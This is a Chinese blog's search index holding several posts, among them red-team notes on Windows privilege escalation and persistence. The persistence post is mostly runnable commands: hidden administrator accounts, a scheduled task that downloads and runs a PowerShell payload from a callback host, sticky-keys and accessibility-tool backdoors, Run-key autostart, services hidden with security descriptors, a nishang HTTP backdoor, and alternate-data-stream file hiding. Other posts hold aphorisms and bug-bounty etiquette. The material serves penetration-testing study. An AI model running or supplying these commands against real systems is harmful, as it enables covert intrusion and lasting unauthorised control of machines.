<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>公告-Blog大事纪</title>
      <link href="/2023/11/05/%E5%85%AC%E5%91%8A/"/>
      <url>/2023/11/05/%E5%85%AC%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>2023-10-29：陆续释放个人笔记</p><p>2023-09-30：对外开放“画廊”专栏</p><p>2023-09-25：在“计划清单”专栏增设PC桌面端App</p><p>2023-09-19：对外开放“计划清单”专栏</p><p>2023-09-03：增加点击特效、看板娘、雪花背景等主题，并适配主题</p><p>2023-08-30：新增站点统计与站点流量监控</p><p>2023-08-25：对外开放“记录榜”专栏</p><p>2023-08-17：修复流程图渲染功能</p><p>2023-08-15：修复图片、emoji表情、数学公告渲染功能</p><p>2023-08-12：正式建站，开始对外开放Blog</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>提权手法</title>
      <link href="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"/>
      <url>/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>提权手法总览：</p><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645420997-889076-image.png" alt="img"></p><h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="1、ByPassUAC"><a href="#1、ByPassUAC" class="headerlink" title="1、ByPassUAC"></a>1、ByPassUAC</h2><p>说明：ByPassUAC 的方法一般有利用系统白名单程序、COM接口以及利用 Windows 自身漏洞等方式。常见工具有 PowerShell 版的 Yamabiko 和需要自己编译的 C 语言版的 UACME 等，UACME 目前已经支持了72 种 ByPassUAC 的方法。</p><p>UACME 项目地址：<a href="https://github.com/hfiref0x/UACME.git%E3%80%82%E5%85%8B%E9%9A%86">https://github.com/hfiref0x/UACME.git。克隆</a> UACME 项目到本地后，使用 Visual Studio&#x2F;MinGW进行编译，然后运行即可</p><pre class="line-numbers language-none"><code class="language-none">#例如以下命令，表示使用 UACME 里的第 62 个方法进行 ByPassUAC，执行成功后，就会直接弹出管理员窗口，没有弹窗提示Akagi.exe 62<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421010-482508-image.png" alt="img"></p><h2 id="2、Windows错误配置"><a href="#2、Windows错误配置" class="headerlink" title="2、Windows错误配置"></a>2、Windows错误配置</h2><h3 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h3><p>说明：可信任服务路径 ( Trusted Service Paths ) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像如下的路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">C:\Program.exeC:\Program Files\Common.exeC:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。所以当我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重新执行时，系统就会执行我们的木马，如果这个程序是系统服务程序，那么就可以获取到对应程序的权限。</p><pre class="line-numbers language-none"><code class="language-none">#通过下面的命令来查找系统中存在可信任服务路径的程序wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/image-20231030231742942.png" alt="image-20231030231742942"></p><p>如下的例子，可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421028-663071-image.png" alt="img"></p><p>使用MSF接收到该靶机的会话(反弹shell)后，可以直接使用MSF利用该漏洞，MSF版本中利用该漏洞的模块是unquoted_service_pat。利用该模块，就可以在存在可信任服务路径漏洞的环境下拿到对应程序所拥有的权限。</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;local&#x2F;unquoted_service_pathset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421042-666334-image.png" alt="img"></p><h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一言</title>
      <link href="/2023/10/29/%E4%B8%80%E8%A8%80/"/>
      <url>/2023/10/29/%E4%B8%80%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<ul><li><p>世界吻我以痛，要我报之以歌</p></li><li><p>大多数人想做医生，却极少人想扫地，这导致了垃圾到处都是</p></li><li><p>木偶拜托了操控它的丝线后究竟是自由了还是变成了废品</p></li><li><p>为什么人生病了是要吃药，世界病了却要吃人</p></li><li><p>小明压力太大连续喝酒死了，那杀死小明的是酒精还是过去</p></li><li><p>我明明看见大街上的人都有翅膀，为什么没有一个人站起来飞翔</p></li><li><p>怀念过去是不是在时间的长河里刻舟求剑，展望未来是不是在前行的路上望梅止渴，活在当下是不是一种见风使舵</p></li><li><p>小孩没有钱就只能回家，大人没有钱就无法回家</p></li><li><p>向禁欲的寺庙求姻缘，向不出门的方丈问人生</p></li><li><p>有目的地的人生才会迷路，我只是来世界散步</p></li><li><p>死亡，是不是也算脱离生命危险</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 哲学与思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透之常识</title>
      <link href="/2023/10/29/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B8%B8%E8%AF%86/"/>
      <url>/2023/10/29/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B8%B8%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>关于漏洞危害定级</p><ul><li>getshell、后台、影响业务——中&#x2F;高危</li><li>间接危害，如XSS——中&#x2F;低危【反射型XSS是低危】，SQL注入【大多数都在中危，少部分高危】</li></ul><br><p>挖洞的注意事项与常识：</p><ul><li>不要在插入数据的地方进行sql注入【比如注册框】</li><li>测试存储型xss的时候严禁弹窗(一些大型src会有相应的测试规范，如腾讯src)，推荐使用console.log()函数，再通过自己的另一个账号进行验证，提供截图证明【将xss的弹窗语句alert()换成控制台语句console.log()，这样就不会影响到业务，是优先选择】</li><li>对于盲xss，仅允许外带domain信息</li><li>所有xss测试，测试之后需删除插入数据，如不能删除，需在漏洞报告中备注插入点</li><li>文件上传漏洞，不要getshell，如果知道文件上传路径，可以print一些内容，如果存在即可说明漏洞</li><li>云服务器别反弹shell，必然会报警(云盾告警)，可以通过CF框架来执行命令，或者通过云控制台进行远程登陆</li><li>在一个内网中，如果有多台Linux和少量winserver，直接对winserver进行信息收集价值可能会更大，因为由于习惯问题，图形化的windows更方便用来管理资产</li><li>CF接管控制台会创建一个后门用户，在使用完后，记得取消接管，使用 cf console cancel命令即可取消接管，后门用户也会随之删除</li><li>专属src算授权，公益src基本都是未授权</li><li>四个准则：不脱库，不传马(phoinfo或者输出123)，不影响用户(不要把平台搞崩溃，越权和逻辑漏洞不要对正常用户下手)，SQL注入查询不超过10行【只要遵守就基本没事】</li></ul><br><p>快速挖洞：如果不是为了CNVD等0day证书，仅仅是为了挖src，可以考虑以下途径</p><ul><li><p>找CMS通杀漏洞【可以去漏洞库找CMS通杀漏洞。漏洞别人已经帮你测好了，你只需要验证，如果存在漏洞，直接写报告提交，不用费时间去慢慢测漏洞。如果没有漏洞，换一个站】</p><p>一些漏洞库：</p><ul><li><p>peiqi文库</p></li><li><p>白阁文库</p></li><li><p>cnvd官方</p></li></ul></li></ul><br><p>安全里面的核心技术：</p><ul><li>0day</li><li>C2武器库</li><li>自启动持久化</li><li>未公开的免杀</li><li>实战经验</li></ul><br><p>有价值的漏洞：</p><ul><li>证书站</li><li>专属企业src</li><li>重点单位机构</li></ul><br><p>优质文章与鸣谢：</p><ul><li>src完整流程案例：<a href="https://bbs.zkaq.cn/t/5893.html">https://bbs.zkaq.cn/t/5893.html</a></li><li>打穿云上内网的攻防实战案例：<a href="https://bbs.zkaq.cn/t/5893.html">https://bbs.zkaq.cn/t/5893.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持手法</title>
      <link href="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/"/>
      <url>/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>在本文从Windows 主机后门、Windows 文件隐藏、域后门、Linux 后门、Linux 文件隐藏这五个方面讨论红队中的权限维持手法</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642995329-754146-image.png" alt="img"></p><p>[TOC]</p><h1 id="Windows主机后门"><a href="#Windows主机后门" class="headerlink" title="Windows主机后门"></a>Windows主机后门</h1><h2 id="1、隐藏账号"><a href="#1、隐藏账号" class="headerlink" title="1、隐藏账号"></a>1、隐藏账号</h2><pre class="line-numbers language-none"><code class="language-none">#这个是比较常见的创建后门的方法，直接建立一个隐藏账号#虽然使用 net user 是看不到这个账号的，但是在控制面板里可以看到，因此这种隐藏效果并不是很好net user teamssix$ Passw0rd &#x2F;addnet localgroup administrators teamssix$ &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121500510.png" alt="image-20231029121500510"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121535128.png" alt="image-20231029121535128"></p><p>说明：想要更好的隐藏效果，可以通过注册表克隆用户实现，只是操作起来比较繁琐。teamssix师傅写的一个利用注册表创建隐藏用户的小工具可以快速实现这个功能【<a href="https://github.com/wgpsec/CreateHiddenAccount%E3%80%91">https://github.com/wgpsec/CreateHiddenAccount】</a></p><pre class="line-numbers language-none"><code class="language-none">#创建一个隐藏用户CreateHiddenAccount.exe -u teamssix -p Passw0rd#检查当前系统的隐藏账号CreateHiddenAccount.exe -c#删除用户CreateHiddenAccount.exe -d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>说明：计划任务也是比较常见的权限维持方法，计划任务在 Win7 之前使用 at 命令，之后的系统中使用 schtasks 命令</p><pre class="line-numbers language-none"><code class="language-none">#每小时执行一次calc.exeschtasks &#x2F;create &#x2F;tn updater &#x2F;tr calc.exe &#x2F;sc hourly &#x2F;mo 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029122454235.png" alt="image-20231029122454235"></p><pre class="line-numbers language-none"><code class="language-none">#当系统空闲时，执行 CS 上线 PowerShell 脚本schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr &quot;powershell.exe -nop -w hidden -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:&#x2F;&#x2F;172.16.214.1:80&#x2F;a&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onidle &#x2F;i 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123133242.png" alt="image-20231029123133242"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123204176.png" alt="image-20231029123204176"></p><h2 id="3、shift后门"><a href="#3、shift后门" class="headerlink" title="3、shift后门"></a>3、shift后门</h2><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123912764.png" alt="image-20231029123912764"></p><pre class="line-numbers language-none"><code class="language-none">#如果提示访问被拒绝，可以在管理员权限下，加上 everyone 的权限再试试cacls C:\Windows\System32\sethc.exe  &#x2F;T &#x2F;E &#x2F;G everyone:Fcopy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123416073.png" alt="image-20231029123416073"></p><pre class="line-numbers language-none"><code class="language-none">#也可以使用注册表REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;C:\windows\system32\cmd.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明：在系统登录界面，按5下shift键就能打开cmd窗口，即粘滞键后门</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029125825458.png" alt="image-20231029125825458"></p><p>补充：除了使用按5下shift 打开粘滞键的功能外，同样的道理，还可以使用辅助工具、放大镜、屏幕键盘等等</p><pre class="line-numbers language-none"><code class="language-none">#这里演示使用辅助工具utilman.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141159902.png" alt="image-20231029141159902"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141321051.png" alt="image-20231029141321051"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995681-882230-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#演示使用屏幕键盘osk.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141628319.png" alt="image-20231029141628319"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995698-111867-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#演示放大镜Magnify.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142221757.png" alt="image-20231029142221757"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142234592.png" alt="image-20231029142234592"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995711-431791-image.png" alt="img"></p><h2 id="4、组策略"><a href="#4、组策略" class="headerlink" title="4、组策略"></a>4、组策略</h2><p>流程：</p><ol><li>新建一个 bat 文件，这里 bat 内容遵循cmd&#x2F;PowerShell语法，比如 calc</li><li>进入本地组策略<ul><li>终端中键入gpedit.msc</li><li>win+R键入gpedit.msc</li></ul></li><li>用户配置–&gt;Windows设置–&gt;脚本登录–&gt;选择 bat 文件【当用户登录时就会触发这个 bat 文件】</li></ol><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995722-703721-image.png" alt="img"></p><h2 id="5、注册表"><a href="#5、注册表" class="headerlink" title="5、注册表"></a>5、注册表</h2><p>说明：在系统启动的注册表下添加恶意程序，这样当用户登录系统时，exe 就会被运行，或者将 exe 直接放到系统启动的文件夹里也是一样的道理</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;Vmware Regg&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\System32\calc.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143436820.png" alt="image-20231029143436820"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143510992.png" alt="image-20231029143510992"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995733-68515-image.png" alt="img"></p><h2 id="6、服务自启动"><a href="#6、服务自启动" class="headerlink" title="6、服务自启动"></a>6、服务自启动</h2><p>说明：直接使用命令创建服务</p><pre class="line-numbers language-none"><code class="language-none">sc create teamssix start&#x3D;auto binPath&#x3D;&quot;cmd.exe &#x2F;k ping -n 1 test.xxx.ceye.io&quot; obj&#x3D;Localsystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143646494.png" alt="image-20231029143646494"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143652136.png" alt="image-20231029143652136"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143704256.png" alt="image-20231029143704256"></p><pre class="line-numbers language-none"><code class="language-none">#启动该服务net start teamssix#可能会报错，但其实是被执行的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995751-115259-image.png" alt="img"></p><p>注意：这种创建服务的方法隐藏性太弱，直接在服务里就能看到</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995769-935072-image.png" alt="img"></p><p>可以在创建完服务后，使用以下命令将创建的服务隐藏，这样不论是在服务中，还是使用命令都查不到这个服务，如下</p><pre class="line-numbers language-none"><code class="language-none">#隐藏服务sc.exe sdset teamssix &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995779-915667-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#可以使用以下命令恢复&amp; $env:SystemRoot\System32\sc.exe sdset teamssix &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7、nishang后门"><a href="#7、nishang后门" class="headerlink" title="7、nishang后门"></a>7、nishang后门</h2><p>说明：nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具【<a href="https://github.com/samratashok/nishang%E3%80%91">https://github.com/samratashok/nishang】</a></p><h3 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h3><pre class="line-numbers language-none"><code class="language-none">cd nishang\BackdoorsImport-Module .\HTTP-Backdoor.ps1HTTP-Backdoor -CheckURL http:&#x2F;&#x2F;192.168.7.1&#x2F;1.txt -PayloadURL http:&#x2F;&#x2F;192.168.7.1&#x2F;calc.ps1 -MagicString start -StopString stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029150732405.png" alt="image-20231029150732405"></p><p><code>说明：该脚本会读取 CheckURL 的内容，这里设置的 MagicString 为 start，即当 http://192.168.7.1/1.txt 内容为 start 的时候，就会执行 http://192.168.7.1/calc.ps1 脚本</code></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995787-819963-image.png" alt="img"></p><h3 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h3><p>说明：Add-ScrnSaveBackdoor 脚本可以帮助攻击者利用 Windows 的屏幕保护程序来安装一个隐藏的后门，该脚本需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Add-ScrnSaveBackdoor.ps1Add-ScrnSaveBackdoor -Payload &quot;Powershell.exe calc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995798-424517-image.png" alt="img"></p><p>当屏幕保护程序启动时，就会运行 Payload 里的内容</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995806-737528-image.png" alt="img"></p><p>除了上面的两个脚本外，还有 Execute-OnTime 和 Invoke-ADSBackdoor。其中 Execute-OnTime 和 HTTP-Backdoor 脚本的使用方法相似，不过增加了定时启动脚本的功能。Windows 下的制作后门方法当然不止上面这些，还有其他的，比如进程注入、dll 劫持等等。</p><h1 id="Windows文件隐藏"><a href="#Windows文件隐藏" class="headerlink" title="Windows文件隐藏"></a>Windows文件隐藏</h1><h2 id="1、文件属性"><a href="#1、文件属性" class="headerlink" title="1、文件属性"></a>1、文件属性</h2><p>说明：文件右击属性，选择隐藏即可</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995815-443214-image.png" alt="img"></p><p>如果想显示文件，就在文件夹选择中选择「显示隐藏的文件、文件夹和驱动器」就行了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995824-299239-image.png" alt="img"></p><p>也可以键入如下命令</p><pre class="line-numbers language-none"><code class="language-none">attrib +s +a +h +r <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995831-613157-image.png" alt="img"></p><h2 id="2、ADS"><a href="#2、ADS" class="headerlink" title="2、ADS"></a>2、ADS</h2><p>说明：ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p><pre class="line-numbers language-none"><code class="language-none">echo teamssix &gt; CreateHiddenAccount_v0.2.exe:test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 是看不到的，使用 dir &#x2F;r 才可以</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995857-995048-image.png" alt="img"></p><p>如果想编辑该文件，可以使用 notepad 进行编辑</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995865-198699-image.png" alt="img"></p><p>如果想执行 exe 文件，可以先创建一个快捷方式，再执行</p><pre class="line-numbers language-none"><code class="language-none">type evil.exe &gt; CreateHiddenAccount_v0.2.exe:evil.exe#需要管理员权限mklink &quot;C:\Users\test\Desktop\evillink.exe&quot; &quot;C:\Users\test\Desktop\CreateHiddenAccount_v0.2.exe:evil.exe&quot;start evil.exe#如果想删除这个隐藏文件，需要删除宿主文件才行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、系统文件夹伪装"><a href="#3、系统文件夹伪装" class="headerlink" title="3、系统文件夹伪装"></a>3、系统文件夹伪装</h2><p>例如这里有一个 test 文件夹，将 test 命名为：我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}，这时文件夹的图标就会变为「我的电脑」图标</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995875-275666-image.png" alt="img"></p><p>使用 dir 可以看到里面的文件，但如果点击这个文件夹，就会真的进入到「我的电脑」界面里</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995882-883710-image.png" alt="img"></p><p>下面是一些其他的常用标识符</p><pre class="line-numbers language-none"><code class="language-none">上帝模式.&#123;ED7BA470-8E54-465E-825C-99712043E01C&#125;CLSIDexcel.&#123;00020810-0000-0000-C000-000000000046&#125;word.&#123;00020900-0000-0000-C000-000000000046&#125;media.&#123;00022603-0000-0000-C000-000000000046&#125;CAB.&#123;0CD7A5C0-9F37-11CE-AE65-08002B2E1262&#125;计划任务.&#123;148BD520-A2AB-11CE-B11F-00AA00530503&#125;搜索-计算机&#123;1f4de370-d627-11d1-ba4f-00a0c91eedba&#125;网上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;控制面板.&#123;21EC2020-3AEA-1069-A2DD-08002B30309D&#125;打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;html.&#123;25336920-03f9-11cf-8fd0-00aa00686f13&#125;mht.&#123;3050F3D9-98B5-11CF-BB82-00AA00BDCE0B&#125;mshta.&#123;3050f4d8-98B5-11CF-BB82-00AA00BDCE0B&#125;我的文档.&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;XML.&#123;48123bc4-99d9-11d1-a6b3-00c04fd91555&#125;回收站(满).&#123;5ef4af3a-f726-11d0-b8a2-00c04fc309a4&#125;回收站.&#123;645FF040-5081-101B-9F08-00AA002F954E&#125;ftp_folder.&#123;63da6ec0-2e98-11cf-8d82-444553540000&#125;网络和拨号连接.&#123;7007ACC7-3202-11D1-AAD2-00805FC1270E&#125;写字板文档.&#123;73FDDC80-AEA9-101A-98A7-00AA00374959&#125;Temporary Offline Files Cleaner.&#123;750fdf0f-2a26-11d1-a3ea-080036587f03&#125;用户和密码.&#123;7A9D77BD-5403-11d2-8785-2E0420524153&#125;Internet 临时文件.&#123;7BD29E00-76C1-11CF-9DD0-00A0C9034933&#125;已下载的程序文件的清除程序.&#123;8369AB20-56C9-11D0-94E8-00AA0059CE02&#125;公文包.&#123;85BBD920-42A0-1069-A2E4-08002B30309D&#125;ActiveX 